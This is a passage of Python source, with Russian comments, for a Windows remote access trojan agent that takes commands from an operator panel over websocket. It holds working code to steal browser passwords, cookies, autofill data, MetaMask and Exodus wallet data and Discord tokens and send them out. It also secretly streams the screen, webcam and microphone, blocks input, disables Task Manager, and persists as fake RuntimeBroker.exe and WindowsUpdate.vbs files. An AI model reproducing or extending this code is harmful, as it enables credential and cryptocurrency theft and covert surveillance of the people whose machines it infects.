            f.write(f'del /f /q "{system_copy}" >nul 2>&1\n')
            # Удаляем копию из AppData
            f.write(f'del /f /q "{appdata_copy}" >nul 2>&1\n')
            f.write(f'echo Done >> "{log_path}"\n')
            # Удаляем bat файл
            f.write(f'del /f /q "%~f0"\n')

        # Запускаем bat файл и завершаем процесс
        try:
            # Запускаем bat файл через Windows API
            import ctypes
            ctypes.windll.shell32.ShellExecuteW(None, "open", bat_path, None, None, 0)
        except:
            # Если не работает, пробуем через subprocess
            try:
                subprocess.Popen(
                    ['cmd.exe', '/c', bat_path],
                    shell=False,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
                )
            except:
                pass

        _log_to_file(f"[UNINSTALL] Agent uninstall initiated")

        # Отправляем ответ перед завершением
        return json.dumps({"status": "uninstalling"})
    except Exception as e:
        _log_to_file(f"[UNINSTALL] Error: {str(e)}")
        return json.dumps({"error": str(e)})


# ═══════════════════════════════════════════════════════════════════
# LOGGING (для записи в файл вместо print)
# ═══════════════════════════════════════════════════════════════════

_log_file = os.path.join(os.environ.get('TEMP', '.'), f'agent_log_{os.getpid()}.txt')

def _log_to_file(message):
    """Записывает лог в файл вместо print()."""
    try:
        with open(_log_file, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now(timezone.utc).isoformat()}] {message}\n")
    except:
        pass


# ═══════════════════════════════════════════════════════════════
# WEBSOCKET EVENT HANDLERS
# ═══════════════════════════════════════════════════════════════

@sio.event
def connect():
    """Подключение к панели управления."""
    _log_to_file(f"[+] Connected to panel: {PANEL_URL}")

    sio.emit('agent_connect', {
        'hostname': socket.gethostname(),
        'ip': get_local_ip(),
        'os': platform.platform(),
        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown'
    })

@sio.event
def connected(data):
    """Получили подтверждение и ID от сервера."""
    global agent_id
    agent_id = data.get('agent_id')
    _log_to_file(f"[+] Registered as agent #{agent_id}")

@sio.event
def command(data):
    """Получена команда от оператора."""
    global should_stop_agent, should_uninstall_agent, uninstall_bat_path
    global webrtc_microphone_enabled, webrtc_system_audio_enabled

    cmd = data.get('command')
    _log_to_file(f"[>] Executing: {cmd}")

    try:
        # Обработка специальных команд
        if cmd.lower() == 'sysinfo':
            result = json.dumps(collect_system_info(), indent=2)

        elif cmd.lower() == 'screenshot':
            result = take_screenshot()

        elif cmd.lower().startswith('start_screen_stream'):
            # Параметры могут прийти через data['params'] (от фронтенда) или из строки команды
            params = data.get('params') if data else None
            _log_to_file(f"[DEBUG] params={params}, data_keys={list(data.keys()) if data else 'no data'}")

            interval = 1.0
            monitor_index = 0
            if params and isinstance(params, dict):
                interval = params.get('interval', 1.0)
                monitor_index = params.get('monitor_index', 0)

            # Также поддерживаем обратную совместимость с строковым форматом
            parts = cmd.split()
            if len(parts) > 1:
                try:
                    interval = float(parts[1])
                except:
                    pass
            if len(parts) > 2:
                try:
                    monitor_index = int(parts[2])
                except:
                    pass

            interval = max(0.2, min(interval, 5.0))
            _log_to_file(f"[DEBUG] Final: interval={interval}, monitor_index={monitor_index}")
            result = start_screen_stream(agent_id, interval, monitor_index)

        elif cmd.lower() == 'stop_screen_stream':
            result = stop_screen_stream()

        elif cmd.lower() == 'start_webrtc_stream':
            if not aiortc_available:
                result = "WebRTC not available"
            else:
                params = data.get('params') if data else {}
                monitor_index = params.get('monitor_index', 0)
                mic_device_index = params.get('mic_device_index')

                with webrtc_lock:
                    webrtc_stream_active = True

                result = f"WebRTC stream ready (monitor: {monitor_index})"
                _log_to_file(f"[WebRTC] Stream started")

        elif cmd.lower() == 'stop_webrtc_stream':
            result = stop_webrtc_stream()

        elif cmd.lower().startswith('start_webcam_stream'):
            params = data.get('params') if data else None
            interval = 0.2
            camera_index = 0
            if params and isinstance(params, dict):
                interval = params.get('interval', 0.2)
                camera_index = params.get('camera', 0)
            parts = cmd.split()
            if len(parts) > 1:
                try:
                    interval = float(parts[1])
                except:
                    pass
            if len(parts) > 2:
                try:
                    camera_index = int(parts[2])
                except:
                    pass
            interval = max(0.1, min(interval, 2.0))
            result = start_webcam_stream(agent_id, interval, camera_index)

        elif cmd.lower() == 'stop_webcam_stream':
            result = stop_webcam_stream()

        elif cmd.lower() == 'get_webcams':
            result = get_webcams()

        elif cmd.lower() == 'get_audio_devices':
            result = get_audio_devices()

        elif cmd.lower() == 'start_microphone_stream':
            print("[DEBUG] Received start_microphone_stream command")
            params = data.get('params') if data else {}
            device_index = params.get('device_index', None)
            print(f"[DEBUG] Calling start_microphone_stream with device_index={device_index}")
            try:
                result = start_microphone_stream(device_index)
                print(f"[DEBUG] start_microphone_stream returned: {result}")
            except Exception as e:
                print(f"[DEBUG] Error calling start_microphone_stream: {e}")
                import traceback
                traceback.print_exc()
                result = json.dumps({"status": "error", "message": str(e)})

        elif cmd.lower() == 'stop_microphone_stream':
            result = stop_microphone_stream()

        elif cmd.lower() == 'start_system_audio_stream':
            result = start_system_audio_stream()

        elif cmd.lower() == 'stop_system_audio_stream':
            result = stop_system_audio_stream()

        elif cmd.lower().startswith('start_microphone_stream'):
            params = data.get('params') if data else None
            chunk_duration = 1.0
            if params and isinstance(params, dict):
                chunk_duration = params.get('chunk_duration', 1.0)
            parts = cmd.split()
            if len(parts) > 1:
                try:
                    chunk_duration = float(parts[1])
                except:
                    pass
            chunk_duration = max(0.5, min(chunk_duration, 5.0))
            result = start_microphone_stream(agent_id, chunk_duration)

        elif cmd.lower() == 'stop_microphone_stream':
            result = stop_microphone_stream()

        elif cmd.lower().startswith('start_system_audio_stream'):
            params = data.get('params') if data else None
            chunk_duration = 0.5  # Уменьшили с 1.0 до 0.5 для меньшей задержки
            if params and isinstance(params, dict):
                chunk_duration = params.get('chunk_duration', 0.5)
            parts = cmd.split()
            if len(parts) > 1:
                try:
                    chunk_duration = float(parts[1])
                except:
                    pass
            chunk_duration = max(0.5, min(chunk_duration, 5.0))
            result = start_system_audio_stream(agent_id, chunk_duration)

        elif cmd.lower() == 'stop_system_audio_stream':
            result = stop_system_audio_stream()

        elif cmd.lower() == 'webcam':
            if cv2:
                cap = cv2.VideoCapture(0)
                if cap.isOpened():
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        _, buffer = cv2.imencode('.jpg', frame)
                        result = base64.b64encode(buffer).decode()
                    else:
                        result = json.dumps({"error": "Failed to capture"})
                else:
                    result = json.dumps({"error": "Cannot access webcam"})
            else:
                result = json.dumps({"error": "cv2 not available"})

        elif cmd.lower().startswith('upload'):
            parts = cmd.split(maxsplit=1)
            if len(parts) > 1 and 'file_data' in data:
                destination = parts[1].strip()
                file_data = data.get('file_data')
                filename = data.get('filename', 'uploaded_file')

                try:
                    # Декодируем base64 и сохраняем файл
                    file_bytes = base64.b64decode(file_data)

                    # Если destination - это директория, добавляем имя файла
                    if os.path.isdir(destination):
                        destination = os.path.join(destination, filename)

                    with open(destination, 'wb') as f:
                        f.write(file_bytes)

                    result = json.dumps({"status": "success", "path": destination, "size": len(file_bytes)})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "No file data or destination path"})

        elif cmd.lower() == 'steal_passwords':
            credentials = extract_chromium_credentials()
            result = json.dumps({"count": len(credentials), "data": credentials[:50]}, indent=2)

        elif cmd.lower() == 'steal_cookies':
            cookies = extract_chromium_cookies()
            result = json.dumps({"count": len(cookies), "data": cookies[:50]}, indent=2)

        elif cmd.lower() == 'steal_autofill':
            autofill = steal_browser_autofill()
            result = json.dumps(autofill, indent=2)

        elif cmd.lower() == 'steal_metamask':
            metamask = steal_metamask_data()
            result = json.dumps({"count": len(metamask), "wallets": metamask}, indent=2)

        elif cmd.lower() == 'steal_exodus':
            exodus = steal_exodus_data()
            result = json.dumps(exodus, indent=2)

        elif cmd.lower() == 'steal_all_crypto':
            crypto = steal_all_crypto_data()
            result = json.dumps(crypto, indent=2)

        elif cmd.lower() == 'steal_discord':
            tokens = steal_discord_tokens()
            result = json.dumps({"count": len(tokens), "tokens": tokens[:10]}, indent=2)

        elif cmd.lower() == 'clipboard':
            clipboard_data = get_clipboard_content()
            result = json.dumps({"data": clipboard_data}, indent=2)

        elif cmd.lower() == 'tasklist':
            result = execute_shell_command('tasklist')

        elif cmd.lower() == 'netstat':
            result = execute_shell_command('netstat -an')

        elif cmd.lower().startswith('dir'):
            result = execute_shell_command(cmd)

        elif cmd.lower().startswith('download'):
            parts = cmd.split(maxsplit=1)
            if len(parts) > 1:
                filepath = parts[1].strip('"')
                try:
                    if os.path.exists(filepath):
                        with open(filepath, 'rb') as f:
                            file_data = base64.b64encode(f.read()).decode()
                        result = json.dumps({"status": "success", "filename": os.path.basename(filepath), "data": file_data})
                    else:
                        result = json.dumps({"error": "File not found"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "No file path specified"})

        elif cmd.lower().startswith('fullscreen_image'):
            print(f"[DEBUG] Received fullscreen_image command, length: {len(cmd)}")
            parts = cmd.split(maxsplit=2)
            if len(parts) > 1:
                image_source = parts[1].strip()
                duration = 30  # По умолчанию 30 секунд

                # Если указана длительность
                if len(parts) > 2:
                    try:
                        duration = int(parts[2])
                    except ValueError:
                        pass

                print(f"[DEBUG] Image source length: {len(image_source)}, duration: {duration}")
                try:
                    # Используем существующую функцию show_fullscreen_image
                    stop_event = threading.Event()

                    # Запускаем напрямую в главном потоке (Tkinter требует главный поток)
                    try:
                        print(f"[DEBUG] Calling show_fullscreen_image...")
                        success = show_fullscreen_image(image_source, stop_event, duration)
                        print(f"[DEBUG] show_fullscreen_image returned: {success}")
                        result = json.dumps({"status": "displayed" if success else "failed", "source": image_source, "duration": duration})
                    except Exception as e:
                        print(f"[DEBUG] Display error: {e}")
                        result = json.dumps({"error": f"Display error: {str(e)}"})
                except Exception as e:
                    print(f"[DEBUG] Outer error: {e}")
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "No image source specified"})

        elif cmd.lower().startswith('block_input'):
            parts = cmd.split()
            duration = 10
            if len(parts) > 1:
                try:
                    duration = int(parts[1])
                except:
                    duration = 10

            if platform.system() == "Windows":
                success = disable_input_devices_combined(duration)
                result = json.dumps({"status": "blocking" if success else "failed", "duration": duration})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower().startswith('rotate_display'):
            parts = cmd.split()
            angle = 90
            if len(parts) > 1:
                try:
                    angle = int(parts[1])
                except:
                    angle = 90

            if platform.system() == "Windows":
                try:
                    success = rotate_display(angle)
                    if success:
                        result = json.dumps({"status": "rotated", "angle": angle})
                    else:
                        result = json.dumps({"error": "Failed to rotate displays"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'disable_mouse':
            if platform.system() == "Windows":
                try:
                    import ctypes
                    ctypes.windll.user32.BlockInput(True)
                    time.sleep(10)
                    ctypes.windll.user32.BlockInput(False)
                    result = json.dumps({"status": "mouse disabled for 10 seconds"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'disable_keyboard':
            if platform.system() == "Windows":
                success = disable_input_devices_combined(10)
                result = json.dumps({"status": "keyboard disabled for 10 seconds" if success else "failed"})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'mute_audio':
            if platform.system() == "Windows":
                try:
                    # Пробуем использовать pycaw если доступен
                    try:
                        from pycaw.pycaw import AudioUtilities

                        devices = AudioUtilities.GetSpeakers()
                        volume = devices.EndpointVolume
                        volume.SetMute(1, None)
                        result = json.dumps({"status": "audio muted"})
                    except ImportError:
                        # Альтернативный метод через nircmd или shell команду
                        result = execute_shell_command('nircmd.exe mutesysvolume 1')
                        if not result or 'error' in result.lower():
                            # Еще один альтернативный метод
                            result = json.dumps({"status": "muted via alternative method", "note": "Install pycaw for better control"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'unmute_audio':
            if platform.system() == "Windows":
                try:
                    try:
                        from pycaw.pycaw import AudioUtilities

                        devices = AudioUtilities.GetSpeakers()
                        volume = devices.EndpointVolume
                        volume.SetMute(0, None)
                        result = json.dumps({"status": "audio unmuted"})
                    except ImportError:
                        result = execute_shell_command('nircmd.exe mutesysvolume 0')
                        if not result or 'error' in result.lower():
                            result = json.dumps({"status": "unmuted via alternative method", "note": "Install pycaw for better control"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'hide_taskbar':
            if platform.system() == "Windows":
                try:
                    import win32gui
                    import win32con

                    taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
                    win32gui.ShowWindow(taskbar, win32con.SW_HIDE)
                    result = json.dumps({"status": "taskbar hidden"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'show_taskbar':
            if platform.system() == "Windows":
                try:
                    import win32gui
                    import win32con

                    taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
                    win32gui.ShowWindow(taskbar, win32con.SW_SHOW)
                    result = json.dumps({"status": "taskbar shown"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'lock_screen':
            if platform.system() == "Windows":
                result = execute_shell_command('rundll32.exe user32.dll,LockWorkStation')
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'get_monitors':
            if platform.system() == "Windows":
                try:
                    import win32api
                    monitors = []
                    for i, monitor in enumerate(win32api.EnumDisplayMonitors()):
                        monitor_info = win32api.GetMonitorInfo(monitor[0])
                        rect = monitor_info['Monitor']
                        monitors.append({
                            'index': i,
                            'name': f"Monitor {i + 1}",
                            'width': rect[2] - rect[0],
                            'height': rect[3] - rect[1],
                            'x': rect[0],
                            'y': rect[1],
                            'primary': monitor_info.get('Flags', 0) == 1
                        })
                    result = json.dumps({'monitors': monitors})
                except Exception as e:
                    result = json.dumps({'error': str(e)})
            else:
                result = json.dumps({'error': 'Windows only'})

        elif cmd.lower() == 'get_drives':
            if platform.system() == "Windows":
                try:
                    import string
                    drives = []
                    for letter in string.ascii_uppercase:
                        drive = f"{letter}:\\"
                        if os.path.exists(drive):
                            try:
                                total, used, free = shutil.disk_usage(drive)
                                drives.append({
                                    'letter': letter,
                                    'path': drive,
                                    'total': total,
                                    'free': free,
                                    'used': used
                                })
                            except:
                                drives.append({
                                    'letter': letter,
                                    'path': drive,
                                    'total': 0,
                                    'free': 0,
                                    'used': 0
                                })
                    result = json.dumps({'drives': drives})
                except Exception as e:
                    result = json.dumps({'error': str(e)})
            else:
                result = json.dumps({'error': 'Windows only'})

        elif cmd.lower().startswith('browse_directory '):
            if platform.system() == "Windows":
                try:
                    path = cmd[17:].strip().strip('"')
                    if not path:
                        path = 'C:\\'

                    items = []
                    try:
                        for item in os.listdir(path):
                            item_path = os.path.join(path, item)
                            try:
                                is_dir = os.path.isdir(item_path)
                                size = 0 if is_dir else os.path.getsize(item_path)
                                items.append({
                                    'name': item,
                                    'path': item_path,
                                    'is_dir': is_dir,
                                    'size': size
                                })
                            except:
                                pass

                        # Сортируем: сначала папки, потом файлы
                        items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))

                        result = json.dumps({
                            'current_path': path,
                            'items': items
                        })
                    except Exception as e:
                        result = json.dumps({'error': str(e), 'current_path': path})
                except Exception as e:
                    result = json.dumps({'error': str(e)})
            else:
                result = json.dumps({'error': 'Windows only'})

        elif cmd.lower() == 'get_running_apps':
            if platform.system() == "Windows":
                try:
                    import win32gui
                    import win32process

                    apps = []
                    seen_pids = set()

                    def enum_callback(hwnd, results):
                        if win32gui.IsWindowVisible(hwnd):
                            window_title = win32gui.GetWindowText(hwnd)
                            if window_title:
                                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                                if pid not in seen_pids:
                                    try:
                                        proc = psutil.Process(pid)
                                        proc_name = proc.name()
                                        seen_pids.add(pid)
                                        results.append({
                                            'name': proc_name,
                                            'title': window_title,
                                            'pid': pid
                                        })
                                    except:
                                        pass
                        return True

                    win32gui.EnumWindows(enum_callback, apps)
                    result = json.dumps({"apps": apps})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower().startswith('block_app '):
            if platform.system() == "Windows":
                try:
                    app_name = cmd[10:].strip()
                    if app_name:
                        blocked_apps[app_name.lower()] = {'name': app_name}

                        # Автоматически запускаем мониторинг если он еще не запущен
                        if not taskmgr_monitor_active:
                            start_taskmgr_monitor()

                        result = json.dumps({"status": "blocked", "app": app_name, "monitoring": True})
                    else:
                        result = json.dumps({"error": "No app name provided"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower().startswith('unblock_app '):
            if platform.system() == "Windows":
                try:
                    app_name = cmd[12:].strip().lower()
                    if app_name in blocked_apps:
                        del blocked_apps[app_name]
                        result = json.dumps({"status": "unblocked", "app": app_name})
                    else:
                        result = json.dumps({"error": "App not in blocked list"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'get_blocked_apps':
            if platform.system() == "Windows":
                try:
                    apps_list = list(blocked_apps.keys())
                    result = json.dumps({"blocked_apps": apps_list})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'start_taskmgr_monitor':
            if platform.system() == "Windows":
                try:
                    success = start_taskmgr_monitor()
                    if success:
                        result = json.dumps({"status": "monitoring started", "active": True})
                    else:
                        result = json.dumps({"status": "already running", "active": True})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'stop_taskmgr_monitor':
            if platform.system() == "Windows":
                try:
                    success = stop_taskmgr_monitor()
                    if success:
                        result = json.dumps({"status": "monitoring stopped", "active": False})
                    else:
                        result = json.dumps({"status": "not running", "active": False})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'disable_taskmanager':
            if platform.system() == "Windows":
                try:
                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
                    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(key)
                    result = json.dumps({"status": "disabled"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'enable_taskmanager':
            if platform.system() == "Windows":
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(key)
                    result = json.dumps({"status": "enabled"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower() == 'shutdown':
            result = execute_shell_command('shutdown /s /t 0')

        elif cmd.lower() == 'enable_autostart':
            # Добавляем агент в автозагрузку
            result = enable_autostart()

        elif cmd.lower() == 'disable_autostart':
            # Удаляем агент из автозагрузки
            result = disable_autostart()

        elif cmd.lower() == 'check_autostart':
            # Проверяем статус автозагрузки
            result = check_autostart()

        elif cmd.lower() == 'stop_agent':
            # Останавливаем агент
            result = json.dumps({"status": "Agent stopping..."})
            # Устанавливаем флаг для остановки после отправки результата
            should_stop_agent = True

        elif cmd.lower() == 'uninstall_agent':
            # Удаляем агент полностью
            try:
                result = json.dumps({"status": "Uninstalling agent..."})

                # Получаем путь к текущему exe (не __file__!)
                script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

                # Пути к возможным копиям
                system_dir = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32')
                system_copy = os.path.join(system_dir, 'RuntimeBroker.exe')
                appdata_copy = os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows', 'RuntimeBroker.exe')

                # Путь к VBS файлу в автозагрузке
                startup_folder = os.path.join(os.environ['APPDATA'],
                                             r'Microsoft\Windows\Start Menu\Programs\Startup')
                vbs_path = os.path.join(startup_folder, 'WindowsUpdate.vbs')

                # Создаем bat файл для самоудаления
                bat_path = os.path.join(os.environ['TEMP'], 'uninstall_agent.bat')
                exe_name = os.path.basename(script_path)
                log_path = os.path.join(os.environ['TEMP'], 'uninstall_log.txt')
                with open(bat_path, 'w') as f:
                    f.write('@echo off\n')
                    f.write(f'echo Starting uninstall at %time% > "{log_path}"\n')
                    f.write(f'echo Target path: {script_path} >> "{log_path}"\n')
                    f.write('timeout /t 2 /nobreak >nul\n')
                    f.write(f'echo Killing process {exe_name} >> "{log_path}"\n')
                    # Убиваем процесс принудительно несколько раз
                    f.write(f'taskkill /F /IM "{exe_name}" >nul 2>&1\n')
                    f.write('timeout /t 2 >nul\n')
                    f.write(f'taskkill /F /IM "{exe_name}" >nul 2>&1\n')
                    # Ждём чтобы Windows освободил файл
                    f.write(f'echo Waiting 10 seconds >> "{log_path}"\n')
                    f.write('timeout /t 10 /nobreak >nul\n')
                    # Удаляем из реестра
                    f.write(f'echo Deleting registry >> "{log_path}"\n')
                    f.write('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v RuntimeBroker /f >nul 2>&1\n')
                    # Удаляем VBS из автозагрузки
                    f.write(f'attrib -h "{vbs_path}" >nul 2>&1\n')
                    f.write(f'del /f /q "{vbs_path}" >nul 2>&1\n')
                    # Пробуем удалить через PowerShell с принудительным снятием атрибутов
                    f.write(f'echo Attempting PowerShell delete >> "{log_path}"\n')
                    f.write(f'powershell -Command "if (Test-Path \\"{script_path}\\") {{ Remove-Item -Path \\"{script_path}\\" -Force -ErrorAction SilentlyContinue }}" >nul 2>&1\n')
                    # Удаляем сам exe через cmd (пробуем много раз)
                    f.write(f'echo Deleting main exe: {script_path} >> "{log_path}"\n')
                    f.write(f'set attempts=0\n')
                    f.write(f':retry\n')
                    f.write(f'set /a attempts+=1\n')
                    f.write(f'attrib -r -s -h "{script_path}" >nul 2>&1\n')
                    f.write(f'del /f /q "{script_path}" >nul 2>&1\n')
                    f.write(f'if exist "{script_path}" (\n')
                    f.write(f'  if %attempts% LSS 10 (\n')
                    f.write(f'    echo Attempt %attempts% failed, retrying >> "{log_path}"\n')
                    f.write(f'    timeout /t 3 /nobreak >nul\n')
                    f.write(f'    goto retry\n')
                    f.write(f'  ) else (\n')
                    f.write(f'    echo Failed to delete after 10 attempts >> "{log_path}"\n')
                    f.write(f'  )\n')
                    f.write(f') else (\n')
                    f.write(f'  echo Main exe deleted successfully >> "{log_path}"\n')
                    f.write(f')\n')
                    # Удаляем копии
                    f.write(f'del /f /q "{system_copy}" >nul 2>&1\n')
                    f.write(f'del /f /q "{appdata_copy}" >nul 2>&1\n')
                    f.write(f'echo Done >> "{log_path}"\n')
                    # Удаляем bat файл
                    f.write(f'del /f /q "{bat_path}"\n')

                # Устанавливаем флаг для удаления после отправки результата
                should_uninstall_agent = True
                uninstall_bat_path = bat_path
            except Exception as e:
                result = json.dumps({"error": str(e)})

        elif cmd.lower() == 'restart':
            result = execute_shell_command('shutdown /r /t 0')

        elif cmd.lower() == 'logoff':
            result = execute_shell_command('shutdown /l')

        elif cmd.lower().startswith('spam_errors_custom'):
            # Парсим кастомную команду: spam_errors_custom count "title" "message"
            import re
            match = re.match(r'spam_errors_custom\s+(\d+)\s+"([^"]*)"\s+"([^"]*)"', cmd, re.IGNORECASE)
            if match:
                count = int(match.group(1))
                title = match.group(2)
                message = match.group(3)
                result = spam_errors_custom(count, title, message)
            else:
                result = json.dumps({"error": "Invalid format. Use: spam_errors_custom count \"title\" \"message\""})

        elif cmd.lower().startswith('spam_errors'):
            # Парсим параметры: spam_errors [count] [delay] [type]
            parts = cmd.split()
            count = 10
            delay = 0.5
            error_type = 'critical'

            if len(parts) > 1:
                try:
                    count = int(parts[1])
                except:
                    pass
            if len(parts) > 2:
                try:
                    delay = float(parts[2])
                except:
                    pass
            if len(parts) > 3:
                error_type = parts[3]

            result = spam_errors(count, delay, error_type)

        elif cmd.lower() == 'change_wallpaper':
            # Меняем обои рабочего стола
            if platform.system() == "Windows":
                try:
                    if 'file_data' in data and 'filename' in data:
                        import ctypes

                        # Декодируем base64 и сохраняем файл
                        file_data = data.get('file_data')
                        filename = data.get('filename')

                        # Сохраняем во временную папку
                        temp_path = os.path.join(os.environ['TEMP'], filename)

                        file_bytes = base64.b64decode(file_data)
                        with open(temp_path, 'wb') as f:
                            f.write(file_bytes)

                        # Устанавливаем обои
                        SPI_SETDESKWALLPAPER = 20
                        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, temp_path, 3)

                        result = json.dumps({"status": "success", "message": "Wallpaper changed successfully"})
                    else:
                        result = json.dumps({"error": "No image data provided"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "Windows only"})

        elif cmd.lower().startswith('open_file '):
            # Открываем файл на целевом ПК
            file_path = cmd[10:].strip()
            if file_path:
                try:
                    import subprocess
                    if platform.system() == "Windows":
                        # Используем os.startfile для открытия файла приложением по умолчанию
                        os.startfile(file_path)
                        result = json.dumps({"status": "success", "message": f"Opening file: {file_path}"})
                    else:
                        # Для Linux/Mac
                        subprocess.Popen(['xdg-open', file_path])
                        result = json.dumps({"status": "success", "message": f"Opening file: {file_path}"})
                except FileNotFoundError:
                    result = json.dumps({"error": f"File not found: {file_path}"})
                except Exception as e:
                    result = json.dumps({"error": str(e)})
            else:
                result = json.dumps({"error": "No file path provided"})

        elif cmd.lower().startswith('open_tabs'):
            # Парсим параметры: open_tabs <url> <count> <delay>
            parts = cmd.split(maxsplit=3)
            if len(parts) >= 4:
                url = parts[1]
                # Добавляем https:// если протокол не указан
                if not url.startswith(('http://', 'https://')):
                    url = 'https://' + url

                try:
                    count = int(parts[2])
                    delay = float(parts[3])

                    # Валидация
                    if count < 1 or count > 100:
                        result = json.dumps({"error": "Tab count must be between 1 and 100"})
                    elif delay < 0 or delay > 60:
                        result = json.dumps({"error": "Delay must be between 0 and 60 seconds"})
                    else:
                        # Открываем вкладки в отдельном потоке
                        def open_tabs_worker():
                            try:
                                import subprocess
                                # Получаем путь к браузеру по умолчанию
                                if platform.system() == "Windows":
                                    for i in range(count):
                                        # Используем start для открытия URL в браузере по умолчанию
                                        # Важно: первый параметр после start - это заголовок окна (пустой "")
                                        subprocess.Popen(f'start "" "{url}"',
                                                       shell=True,
                                                       creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
                                        if i < count - 1:
                                            time.sleep(delay)
                                else:
                                    # Для Linux/Mac используем webbrowser
                                    import webbrowser
                                    for i in range(count):
                                        webbrowser.open(url, new=2)
                                        if i < count - 1:
                                            time.sleep(delay)
                            except Exception as e:
                                _log_to_file(f"[!] Error opening tabs: {e}")

                        thread = threading.Thread(target=open_tabs_worker, daemon=True)
                        thread.start()
                        result = json.dumps({"status": "success", "message": f"Opening {count} tabs with {delay}s delay"})
                except ValueError:
                    result = json.dumps({"error": "Invalid count or delay value"})
            else:
                result = json.dumps({"error": "Usage: open_tabs <url> <count> <delay>"})

        elif cmd.lower() == 'enable_microphone':
            webrtc_microphone_enabled = True
            _log_to_file(f"[Audio] Microphone enabled: {webrtc_microphone_enabled}")
            result = json.dumps({
                'success': True,
                'message': 'Microphone enabled',
                'audio_state': {
                    'microphone': webrtc_microphone_enabled,
                    'system_audio': webrtc_system_audio_enabled
                }
            })

        elif cmd.lower() == 'disable_microphone':
            webrtc_microphone_enabled = False
            _log_to_file(f"[Audio] Microphone disabled: {webrtc_microphone_enabled}")
            result = json.dumps({
                'success': True,
                'message': 'Microphone disabled',
                'audio_state': {
                    'microphone': webrtc_microphone_enabled,
                    'system_audio': webrtc_system_audio_enabled
                }
            })

        elif cmd.lower() == 'enable_system_audio':
            webrtc_system_audio_enabled = True
            _log_to_file(f"[Audio] System audio enabled: {webrtc_system_audio_enabled}")
            result = json.dumps({
                'success': True,
                'message': 'System audio enabled',
                'audio_state': {
                    'microphone': webrtc_microphone_enabled,
                    'system_audio': webrtc_system_audio_enabled
                }
            })

        elif cmd.lower() == 'disable_system_audio':
            webrtc_system_audio_enabled = False
            _log_to_file(f"[Audio] System audio disabled: {webrtc_system_audio_enabled}")
            result = json.dumps({
                'success': True,
                'message': 'System audio disabled',
                'audio_state': {
                    'microphone': webrtc_microphone_enabled,
                    'system_audio': webrtc_system_audio_enabled
                }
            })

        elif cmd.lower() == 'list_audio_devices':
            try:
                p = pyaudio.PyAudio()
                devices = []
                for i in range(p.get_device_count()):
                    try:
                        info = p.get_device_info_by_index(i)
                        devices.append({
                            'index': i,
                            'name': info.get('name'),
                            'inputs': info.get('maxInputChannels'),
                            'outputs': info.get('maxOutputChannels'),
                            'hostApi': info.get('hostApi'),
                            'defaultRate': info.get('defaultSampleRate'),
                        })
                    except Exception:
                        pass
                p.terminate()
                _log_to_file(f"[Audio] list_audio_devices: {len(devices)} devices")
                result = json.dumps({'devices': devices})
            except Exception as e:
                result = json.dumps({'error': str(e)})

        elif cmd.lower() == 'get_audio_state':
            result = json.dumps({
                'audio_state': {
                    'microphone': webrtc_microphone_enabled,
                    'system_audio': webrtc_system_audio_enabled
                }
            })
